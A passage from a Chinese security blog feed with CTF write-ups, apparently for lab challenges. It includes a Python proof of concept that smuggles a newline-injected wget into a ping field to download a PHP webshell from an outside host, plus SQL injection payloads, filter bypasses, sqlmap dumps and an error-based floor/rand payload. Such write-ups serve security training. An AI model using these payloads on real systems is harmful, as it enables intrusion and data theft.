class="string">'REMOTE_ADDR'</span>];</div><div class="line">    <span class="keyword">if</span>(!file_exists($dir)) mkdir($dir);</div><div class="line">    chdir($dir);</div><div class="line"></div><div class="line">    $comments = <span class="string">&lt;&lt;&lt;INFO</span></div><div class="line"><span class="string">   &lt;!--</span></div><div class="line"><span class="string">      \$dir = 'sandBox/'.\$_SERVER['REMOTE_ADDR'];</span></div><div class="line"><span class="string">    if(!file_exists(\$dir)) mkdir(\$dir);</span></div><div class="line"><span class="string">    chdir(\$dir); </span></div><div class="line"><span class="string">   --&gt;</span></div><div class="line"><span class="string">INFO;</span></div><div class="line">    <span class="keyword">echo</span> $comments;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</div><div class="line">            <span class="comment">// Windows</span></div><div class="line">            $cmd = shell_exec( <span class="string">'ping  '</span> . $ip );</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="comment">// *nix</span></div><div class="line">            $cmd = shell_exec( <span class="string">'ping  -c 1 '</span> . $ip );</div><div class="line">    &#125;</div><div class="line">        <span class="comment">// Feedback for the end user</span></div><div class="line">        <span class="keyword">echo</span>  <span class="string">"&lt;pre&gt;$cmd&lt;/pre&gt;"</span>;</div></pre></td></tr></table></figure></p><p>过滤了一些命令执行的一些关键词 &amp;;$()`| ，全部替换为空了。然后输入的内容长度必须在7到15之间（IP长度限制）<br>最上面参考文章的大佬说没有过滤换行符%0a，换行符过滤正则表达式的匹配和字符长度匹配。也就是通过ping 0.0.0.0  加上%0a(shell命令)来绕过不能用linux的连接词的过滤。<br>可以通过wget 命令 远程下载一个shell，但是由于字符限制，所以需要用到/来连接2行命令的字符。  </p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>上poc  </p><pre><code class="python"><span class="comment">#!/usr/bin/python</span><span class="comment"># -*- coding: utf-8 -*-</span><span class="keyword">import</span> requests<span class="function"><span class="keyword">def</span> <span class="title">GetShell</span><span class="params">()</span>:</span>    s=requests.session()    url = <span class="string">"http://192.168.60.128/CTF/wonderkun/CTF_web/web200-3/src/ping.php"</span>    url1 = <span class="string">"http://192.168.60.128/web200-3/src/"</span>    header = {        <span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>    }    data1={<span class="string">'username'</span>:<span class="string">'a'</span>,<span class="string">'password[]'</span>:<span class="string">'a'</span>}    s.post(url1,data=data1,headers=header)    <span class="string">'''</span><span class="string">    wget\\</span><span class="string">    \ 19\\</span><span class="string">    2.\\</span><span class="string">    16\\</span><span class="string">    8.\\</span><span class="string">    60.\\</span><span class="string">    12\\</span><span class="string">    8\ \\</span><span class="string">    1.php\ \\</span><span class="string">    -O\ \\</span><span class="string">    2.php</span><span class="string">    '''</span>    fileNames = [<span class="string">"2.php"</span>, <span class="string">"-O\ \\\\"</span>, <span class="string">"1.php\ \\"</span>,<span class="string">"8\ \\\\"</span>, <span class="string">"12\\\\"</span>, <span class="string">"60.\\\\"</span>, <span class="string">"8.\\\\"</span>, <span class="string">"16\\\\"</span>,<span class="string">"2.\\\\"</span>, <span class="string">"\ 19\\\\"</span>, <span class="string">"wget\\\\"</span>]   <span class="comment"># 多出的\只是为了充填，无论几个\都是一样的作用</span>    ip = <span class="string">"0.0.0.1%0a"</span>    <span class="keyword">for</span> fileName <span class="keyword">in</span> fileNames:        createFileIp = ip + <span class="string">"&gt;"</span> + fileName        <span class="keyword">print</span> createFileIp        data = <span class="string">"ip="</span> + createFileIp        s.post(url, data=data,headers=header,)    getShIp = ip + <span class="string">"ls%20-t&gt;1"</span>  <span class="comment">#新生成的文件输入进1中</span>    <span class="keyword">print</span> getShIp    data = <span class="string">"ip="</span> + getShIp    s.post(url, data=data,headers=header)    getShellIp = ip + <span class="string">"sh%201"</span> <span class="comment"># 执行1这个脚本</span>    <span class="keyword">print</span> getShellIp    data = <span class="string">"ip="</span> + getShellIp    s.post(url, data=data,headers=header)<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:    GetShell()</code></pre><p>为了wget，先是把他们生成很多个临时文件，然后ls -t&gt;1，然后再sh一下就执行了。我在测试的时候wget了自己的虚拟机，然后生成的文件里面是sever 500 的提示，想了半天自己的虚拟机又不在网络上，怎么可能wget到，真的是石乐志，哈哈。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;参考文章：&quot;&gt;&lt;a href=&quot;#参考文章：&quot; class=&quot;headerlink&quot; title=&quot;参考文章：&quot;&gt;&lt;/a&gt;参考文章：&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://isron.dropsec.xyz/2017/04/10/shell-7/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://isron.dropsec.xyz/2017/04/10/shell-7/&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.moonsos.com/post/256.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.moonsos.com/post/256.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://wonderkun.cc/index.html/?p=524&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://wonderkun.cc/index.html/?p=524&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;原理解析&quot;&gt;&lt;a href=&quot;#原理解析&quot; class=&quot;headerlink&quot; title=&quot;原理解析&quot;&gt;&lt;/a&gt;原理解析&lt;/h3&gt;&lt;p&gt;从wonderkun师傅的&lt;a href=&quot;https://github.com/clearloveQAQ/CTF_web/tree/master/web200-3&quot; title=&quot;github&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;github&lt;/a&gt;&lt;br&gt;上d下原码，在本地实现下。不多说，直接上原码&lt;br&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://whc.dropsec.xyz/categories/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Linux" scheme="http://whc.dropsec.xyz/categories/%E6%BC%8F%E6%B4%9E/Linux/"/>
    
      <category term="CTF" scheme="http://whc.dropsec.xyz/categories/%E6%BC%8F%E6%B4%9E/Linux/CTF/"/>
    
    
      <category term="命令执行" scheme="http://whc.dropsec.xyz/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="Linux" scheme="http://whc.dropsec.xyz/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>实验吧决斗场Writeup</title>
    <link href="http://whc.dropsec.xyz/2017/04/20/%E5%AE%9E%E9%AA%8C%E5%90%A7%E5%86%B3%E6%96%97%E5%9C%BAWriteup/"/>
    <id>http://whc.dropsec.xyz/2017/04/20/实验吧决斗场Writeup/</id>
    <published>2017-04-20T04:23:05.000Z</published>
    <updated>2017-06-15T13:50:06.023Z</updated>
    
    <content type="html"><![CDATA[<h3 id="00x1-到底是不是number呢？"><a href="#00x1-到底是不是number呢？" class="headerlink" title="00x1 到底是不是number呢？"></a>00x1 到底是不是number呢？</h3><p>首先抓包看流量，看到Response包里有个<br><img src="http://i1.piimg.com/567571/63ae606b7d046199.png" alt=""></p><p>打开这个目录，得到原码<br>分析原码<br><a id="more"></a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$info = <span class="string">""</span>;</div><div class="line">$req = [];   <span class="comment">//数组</span></div><div class="line">$flag=<span class="string">"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span>;</div><div class="line"></div><div class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);</div><div class="line">error_reporting(<span class="number">0</span>);           <span class="comment">//关闭错误报告</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'number'</span>]))&#123;</div><div class="line">   header(<span class="string">"hint:26966dc52e85af40f59b4fe73d8c323a.txt"</span>); <span class="comment">//发送http头</span></div><div class="line"></div><div class="line">   <span class="keyword">die</span>(<span class="string">"have a fun!!"</span>);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">foreach</span>([$_GET, $_POST] <span class="keyword">as</span> $global_var) &#123; <span class="comment">//把get或者post进去的值取做全局var</span></div><div class="line">    <span class="keyword">foreach</span>($global_var <span class="keyword">as</span> $key =&gt; $value) &#123; <span class="comment">//字符串的键值自动变成下标</span></div><div class="line">        $value = trim($value); <span class="comment">//把value两边的空格啥的去掉</span></div><div class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value);<span class="comment">//if(is_string)成立则把value中的双引号前加\赋值给</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_palindrome_number</span><span class="params">($number)</span> </span>&#123;     <span class="comment">//判断是不是回文数字</span></div><div class="line">    $number = strval($number);                        <span class="comment">//把数字的字符串值传给number</span></div><div class="line">    $i = <span class="number">0</span>;</div><div class="line">    $j = strlen($number) - <span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span>($i &lt; $j) &#123;</div><div class="line">        <span class="keyword">if</span>($number[$i] !== $number[$j]) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div><div class="line">        $i++;</div><div class="line">        $j--;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(is_numeric($_REQUEST[<span class="string">'number'</span>]))&#123;                  <span class="comment">//检测是否为是数字字符串，不是则报错</span></div><div class="line"></div><div class="line">   $info=<span class="string">"sorry, you cann't input a number!"</span>;</div><div class="line"></div><div class="line">&#125;<span class="keyword">elseif</span>($req[<span class="string">'number'</span>]!=strval(intval($req[<span class="string">'number'</span>])))&#123; <span class="comment">//</span></div><div class="line"></div><div class="line">     $info = <span class="string">"number must be equal to it's integer!! "</span>;</div><div class="line"></div><div class="line">&#125;  </div><div class="line"><span class="keyword">else</span>&#123;  </div><div class="line"></div><div class="line">     $value1 = intval($req[<span class="string">"number"</span>]);</div><div class="line">     $value2 = intval(strrev($req[<span class="string">"number"</span>]));</div><div class="line"></div><div class="line">     <span class="keyword">if</span>($value1!=$value2)&#123;</div><div class="line">          $info=<span class="string">"no, this is not a palindrome number!"</span>;</div><div class="line">     &#125;<span class="keyword">else</span>&#123;</div><div class="line"></div><div class="line">          <span class="keyword">if</span>(is_palindrome_number($req[<span class="string">"number"</span>]))&#123;</div><div class="line">              $info = <span class="string">"nice! &#123;$value1&#125; is a palindrome number!"</span>;</div><div class="line">          &#125;<span class="keyword">else</span>&#123;</div><div class="line">             $info=$flag;</div><div class="line">          &#125;</div><div class="line">     &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> $info;</div></pre></td></tr></table></figure></p><p>首先你GET或者POST进去的参数必须是字符型数字，想到用unicode码 %20 空格 和%00 来让它变成字符型数字，最后还要确定输入的字符型数字不为回文，看到网上的思路 0e-0可一用来绕过。</p><h3 id="00x2-登陆一下好吗？"><a href="#00x2-登陆一下好吗？" class="headerlink" title="00x2 登陆一下好吗？"></a>00x2 登陆一下好吗？</h3><p>这道题你随便输入写什么，他都会跳给你一个页面，比如说我在账号里输入一个a<br>我猜测它存在SQL注入</p><p>尝试一下万能密码<br>admin’ or ‘1’=’1</p><p>万能密码原理：<br>在SQL语言中 and优先于or<br> not and or<br>所以逻辑从先or  再and 变成了   先and 再or<br>or前后2个条件只要有一个成立就行了<br><img src="http://i2.muimg.com/567571/653007b080685217.png" alt=""></p><p>回到这道题上，放入万能密码后<br><img src="http://i4.buimg.com/567571/8c8497335fce0340.png" alt=""><br>明显过滤了or，那么‘or’的万能密码就不能用了，只能重新构造。<br>看看还过滤了什么<br><img src="http://i4.buimg.com/567571/e5efecae96d59114.png" alt=""></p><p>猜测<br>原语句应该为 select * from user where username=’’ and password=’’</p><p>当提交username=pcat’=’&amp;password=pcat’=’<br>语句会变成如下：<br>select * from user where username=’pcat’=’’ and password=’pcat’=’’<br>这时候还不够清晰，我提取前一段判断出来（后面的同样道理）<br>username=’pcat’=’’<br>这是有2个等号，然后计算顺序从左到右，<br>先计算username=’pcat’ 一般数据库里不可能有我这个小名（若有，你就换一个字符串），所以这里返回值为0（相当于false）<br>然后0=’’ 这个结果呢？看到这里估计你也懂了，就是返回1（相当于true）</p><p>其实就是个php弱类型比较，让我(ˇ?ˇ) 想我还真的想不到这种方法。</p><p>说白了这道题也就过滤了一个 or –让你没法注释，还有一般的万能密码。</p><h3 id="00x3-因垂丝汀的绕过"><a href="#00x3-因垂丝汀的绕过" class="headerlink" title="00x3 因垂丝汀的绕过"></a>00x3 因垂丝汀的绕过</h3><p>在源码注释看到了source.txt，打开发现原码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="comment">//前端页面</span></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'pwd'</span>])) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//一个过滤函数</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123; </div><div class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</div><div class="line">        $StrValue=implode($StrValue); <span class="comment">//implode函数是将 一位数组转化为字符串</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123; </div><div class="line">        <span class="keyword">print</span> <span class="string">"水可载舟，亦可赛艇"</span>;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</div><div class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123;</div><div class="line">    AttackFilter($key,$value,$filter);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</div><div class="line"><span class="keyword">if</span> (!$con)&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line">$db=<span class="string">"XXXXXX"</span>;</div><div class="line">mysql_select_db($db, $con);</div><div class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</div><div class="line">$query = mysql_query($sql);</div><div class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123;</div><div class="line">    $key = mysql_fetch_array($query);</div><div class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"亦可赛艇"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"一颗赛艇！"</span>;</div><div class="line">&#125;</div><div class="line">mysql_close($con);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>这个代码不复杂，就是查询一个是否存在数据库中的 数据，如果账户密码相同则输出flag，账户相同密码不同则输出 “一颗赛艇”，注意下mysql_num_rows作用是取得结果集中行的数目，表示取得uname是否存在。<br>这个代码先把post上去的数据中“and|select|from|where|union|join|sleep|benchmark|”全部去除，所以基本上一般的注入不可行。但是他没有过滤or，所以感觉可以构造万能密码类似的playload来绕过 mysql_num_rows($query) == 1<br>palayload:<br>uname=admin’ or 1=1#&amp;pwd=<br>一颗赛艇<br>结果集中只取一个，所以加上limit限制<br>playload:<br>uname=admin’ or 1=1 limit 1#&amp;pwd=<br>亦可赛艇</p><p>现在不知道密码，看到是 == ，弱类型，一开始想的是用 pwd[]=来绕过，但是上面已经用过数组直接转换为字符型了，所以不行。<br>看网上的wp，说利用 group by with rollup来绕过，这个with rollup来改善统计性能的 。<br>-mysql&gt; select dep,pos,avg(sal) from employee group by dep,pos with rollup;<br>+——+——+———–+<br> | dep | pos | avg(sal) |<br>+——+——+———–+<br> | 01 | 01 | 1500.0000 |<br> | 01 | 02 | 1950.0000 |<br> | 01 | NULL | 1725.0000 |<br> | 02 | 01 | 1500.0000 |<br> | 02 | 02 | 2450.0000 |<br> | 02 | NULL | 2133.3333 |<br> | 03 | 01 | 2500.0000 |<br> | 03 | 02 | 2550.0000 |<br> | 03 | NULL | 2533.3333 |<br> | NULL | NULL | 2090.0000 |<br> +——+——+———–+<br>其实就是多出一行来统计类似平均数的，可以利用的点就是group by 后面的字段在最后一行是NULL，所以就是利用到题目上就是NULL=空字符串<br>playload:<br>uname=admin’ or 1=1 group by pwd with rollup limit 1 offset 2#&amp;pwd=<br>至于为什么是第3条数据，这个就是一个个猜出来的。</p><p>offset是来代替“，”的，但是意思有所区别。<br><img src="http://i4.buimg.com/567571/4f0e92e33f55f353.png" alt=""><br>limit 1 offset 2 是取到2，而limit1，2是取2个。</p><h3 id="00x4-简单的sql注入"><a href="#00x4-简单的sql注入" class="headerlink" title="00x4 简单的sql注入"></a>00x4 简单的sql注入</h3><p>我做sql注入题目的一般思路</p><ol><li>判断有没有读写权限</li><li>判断注入点</li><li>查出基本信息</li><li>爆表爆列爆用户名密码</li></ol><p>做这道题目的时候，下意识的查看了一下原码，发现表单那里post上去的字段名是id，那么联想到sqllab了。<br>输入数值1返回结果：  </p><blockquote><p>ID: 1<br>name: baloteli</p></blockquote><p>在输入1\：</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1\’’ at line 1</p></blockquote><p>可见输入的是字符型，注入点存在，and 1 2一下，</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘1=1+’’ at line 1    </p></blockquote><p>说明好像过滤掉了些东，fuzz测试一下（模糊测），输入</p><blockquote><p>1 and or where union select database() sleep() information_schema schemata column from # –</p></blockquote><p>返回结果：</p><blockquote><p>ID: 1 or where<br>name: baloteli</p></blockquote><p>从id项看出有几个已经被过滤掉了，而且是直接把关键字给去掉，那么可以用类似ab(abc)c来绕过过滤，abc是要绕过的关键字，使用时不加括号，这里加括号只是为了区分，也就是过滤了select，那么我在select周围加了一个select不就行了，selecselectt，把里面select过滤了，外面的selec 和t组合一下就是一个select。</p><ul><li>开始爆一下一些基本信息<blockquote><p>id=1’ ununionion seselectlect database() frofromm information_schema.schemata wherwheree ‘1’=’1  </p><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘seselectlect database() frofromm information_schema.schemata wherwheree ‘1’=’1’’ at line 1</p></blockquote></li></ul><p>看到出错的信息还是这样，没有union那几个关键词没有过滤掉，还是哪里出现了问题，思路应该是没有问题的，我看了一看浏览器的url，发现。。。里面关键词前面有个+号，过滤了空格，坑死爹了。那么更改plagload:</p><blockquote><p>id=1’+ununionion+seselectlect+database()+frofromm+information_schema.schemata+wherwheree+’1’=’1  </p></blockquote><p>还是上面的错误，那么多加个空格呢</p><blockquote><p>id=1’ +ununionion +seselectlect +database() +frofromm +information_schema.schemata +wherwheree +’1’=’1  </p></blockquote><p>还是不行<br>全换成空格呢(注意是2个空格，有可能hexo主题的原因把我的空格吃了)</p><blockquote><p>id=1’  ununionion  seselectlect  database()  frofromm  information_schema.schemata  wherwheree  ‘1’=’1  </p></blockquote><p>发现。。。ab(abc)c这样的形式不行，换成abcabc这样的形式，发现可以，具体的我也不清楚,有可能是正则的问题。  </p><blockquote><p>id=1’  unionunion  selectselect  database()  fromfrom  information_schema.schemata  wherewhere  ‘1’=’1</p><p>ID: 1’ union select database() from information_schema.schemata where ‘1’=’1<br>name: baloteli<br>ID: 1’ union select database() from information_schema.schemata where ‘1’=’1<br>name: web1</p></blockquote><p>那么其他的都是简单操作了<br>不再一一操作上playload了<br>除了。。。在爆列名的时候，又过滤了column_name和information_schema.columns以外就没什么  </p><blockquote><p>id=1’  unionunion  selectselect  column_namcolumn_namee  fromfrom  information_schema.coluinformation_schema.columnsmns wherewhere  table_name=’flag</p></blockquote><p>这个也很奇怪，有的时候需要用到abcabc的形式，有的时候要用到ab(abc)c</p><h3 id="00x5-简单的sql注入2"><a href="#00x5-简单的sql注入2" class="headerlink" title="00x5 简单的sql注入2"></a>00x5 简单的sql注入2</h3><p>答题思路大体上都是那样。这里有一些不一样，就是检测到空格和一些其他关键字就直接die(“SQLi detected”)，不知道后台是否存在关键词的替代。<br>根据wp的猜测<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">for_each ($query_list <span class="keyword">as</span> $value) &#123;  </div><div class="line"><span class="keyword">if</span> (in_array($value,$filter_array)) &#123;  </div><div class="line"><span class="keyword">die</span>(<span class="string">"SQLi detected"</span>) ;</div></pre></td></tr></table></figure></p><p>就是直接检测是否存在这些关键词，有的话直接输出这个SQLi detected。替换就跟上面那个一样多加一层。<br>于是就测试一下。<br>先输入 1\，还是字符型。<br>那么加个几个关键词<br>1’ and ‘1’=’1<br>SQLi detected<br>不知道是and还是其他北过滤了，把and去掉，改成1’=’1，进去了，改成1’and，没有空格，发现了空格在那个过滤数组中，那么绕过空格，把每一个 空格都替换成/<em>*/，(因为HTML语法和md语法的原因我的</em>被吃了，所以补上playload了)<br><img src="http://i1.piimg.com/588926/799499324a1ff4b8.png" alt=""></p><p>剩下的就没什么了。</p><h3 id="00x6-简单的sql注入3"><a href="#00x6-简单的sql注入3" class="headerlink" title="00x6 简单的sql注入3"></a>00x6 简单的sql注入3</h3><p>手注没有注入出来，他说是报错注入。。。然后我就傻乎乎地用那几个报错函数死命的注入。。。最后回显一个don’t。。。看来只能盲注了。盲注手工太麻烦了。。。直接上sqlmap</p><p>判断注入点  </p><blockquote><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“</p></blockquote><p>判断数据库  </p><blockquote><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ –dbs</p></blockquote><p>判断表名  </p><blockquote><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“  –tables</p></blockquote><p>判断字段名  </p><blockquote><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ -T “表名” –columns</p></blockquote><p>查内容  </p><blockquote><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“  –dump  -T “flag” -C “flag”</p></blockquote><p>以后做到哪，这篇博客就跟到哪。。。哈哈哈~</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;00x1-到底是不是number呢？&quot;&gt;&lt;a href=&quot;#00x1-到底是不是number呢？&quot; class=&quot;headerlink&quot; title=&quot;00x1 到底是不是number呢？&quot;&gt;&lt;/a&gt;00x1 到底是不是number呢？&lt;/h3&gt;&lt;p&gt;首先抓包看流量，看到Response包里有个&lt;br&gt;&lt;img src=&quot;http://i1.piimg.com/567571/63ae606b7d046199.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;打开这个目录，得到原码&lt;br&gt;分析原码&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://whc.dropsec.xyz/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://whc.dropsec.xyz/tags/CTF/"/>
    
      <category term="Writeup" scheme="http://whc.dropsec.xyz/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>SQL报错注入总结</title>
    <link href="http://whc.dropsec.xyz/2017/04/16/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>http://whc.dropsec.xyz/2017/04/16/SQL报错注入总结/</id>
    <published>2017-04-16T07:07:59.000Z</published>
    <updated>2017-07-18T03:20:28.923Z</updated>
    
    <content type="html"><![CDATA[<h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p><a href="http://www.waitalone.cn/mysql-error-based-injection.html" target="_blank" rel="external">http://www.waitalone.cn/mysql-error-based-injection.html</a><br><a href="http://www.111cn.net/database/mysql/47680.htm" target="_blank" rel="external">http://www.111cn.net/database/mysql/47680.htm</a></p><p>一些基本的查基本信息的语句：</p><p>查库 (select schema_name from information_schema.schemata limit m,n)</p><p>查表 (select table_name from information_schema.columns where table_schema=’whc’ limit 0,1)</p><p>查字段 (select column_name from information_schema.columns where table_schema=’whc’ limit 0,1)</p><p>加上limit 是因为sqllab里面限制了回显的个数，实战里面应该用不到。<br><a id="more"></a></p><h3 id="00x1-floor方式"><a href="#00x1-floor方式" class="headerlink" title="00x1 floor方式"></a>00x1 floor方式</h3><p><strong>用法：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select 1,count(*),concat(0x3a,0x3a,(select use()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;</div></pre></td></tr></table></figure><p><strong>函数释义：</strong></p><blockquote><p>rand() 随机数函数 产生0-1的随机数<br>count(_) 计数<br>floor() 向下取整函数，舍去小数点，比如：floor(1.3)=1<br>floor(rand()_2) 结果只有0和1<br>group by name 按name的首位字典顺序排列<br>concat() 连接括号里面的内容<br>select 1 from (table name) 派生表</p></blockquote><p>此处有三个点，一是需要count计数，二是floor，取得0 or 1，进行数据的重复，三是group by进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时重复造成的错误。也有解释为mysql 的bug 的问题。但是此处需要将rand(0)，rand()需要多试几次才行。</p><p><strong>在sqllab less-5上进行测试</strong></p><p><img 